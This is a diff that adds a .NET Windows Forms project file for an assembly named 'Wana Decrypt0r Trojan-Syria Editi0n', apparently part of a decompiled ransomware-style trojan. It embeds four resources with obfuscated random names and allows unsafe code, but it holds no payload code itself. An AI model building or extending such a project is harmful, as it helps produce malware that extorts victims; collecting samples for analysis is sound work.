@@ -1,0 +1,36 @@
+<Project Sdk="Microsoft.NET.Sdk.WindowsDesktop">
+  <PropertyGroup>
+    <AssemblyName>Wana Decrypt0r Trojan-Syria Editi0n</AssemblyName>
+    <GenerateAssemblyInfo>False</GenerateAssemblyInfo>
+    <OutputType>WinExe</OutputType>
+    <UseWindowsForms>True</UseWindowsForms>
+    <TargetFramework>net40</TargetFramework>
+  </PropertyGroup>
+  <PropertyGroup>
+    <LangVersion>Preview</LangVersion>
+    <AllowUnsafeBlocks>True</AllowUnsafeBlocks>
+  </PropertyGroup>
+  <PropertyGroup>
+    <ApplicationIcon>app.ico</ApplicationIcon>
+    <RootNamespace />
+  </PropertyGroup>
+  <ItemGroup>
+    <None Remove="6vNmRjC4gOZiBtC6vM.4arM1PTsUuU0dJkB09" />
+    <None Remove="Rl3wCIlZTh8YwhNIix.DafTY74bOQehS3resT" />
+    <None Remove="G8HoRHoRKaQVfb8Lqk.UgDqZe53gfElK7Io42" />
+    <None Remove="VkTkkr0rdlyN3eYBlD.UbMQ1JrdJxciaZacwp" />
+    <EmbeddedResource Include="6vNmRjC4gOZiBtC6vM.4arM1PTsUuU0dJkB09" />
+    <EmbeddedResource Include="Rl3wCIlZTh8YwhNIix.DafTY74bOQehS3resT" />
+    <EmbeddedResource Include="G8HoRHoRKaQVfb8Lqk.UgDqZe53gfElK7Io42" />
+    <EmbeddedResource Include="VkTkkr0rdlyN3eYBlD.UbMQ1JrdJxciaZacwp" />
+  </ItemGroup>
+  <ItemGroup>
+    <Reference Include="Microsoft.VisualBasic" />
+    <Reference Include="System.Xml.Linq">
+      <HintPath>/home/petik/dotnet/shared/Microsoft.NETCore.App/6.0.8/System.Xml.Linq.dll</HintPath>
+    </Reference>
+    <Reference Include="System.Core">
+      <HintPath>/home/petik/dotnet/shared/Microsoft.NETCore.App/6.0.8/System.Core.dll</HintPath>
+    </Reference>
+  </ItemGroup>
+</Project>
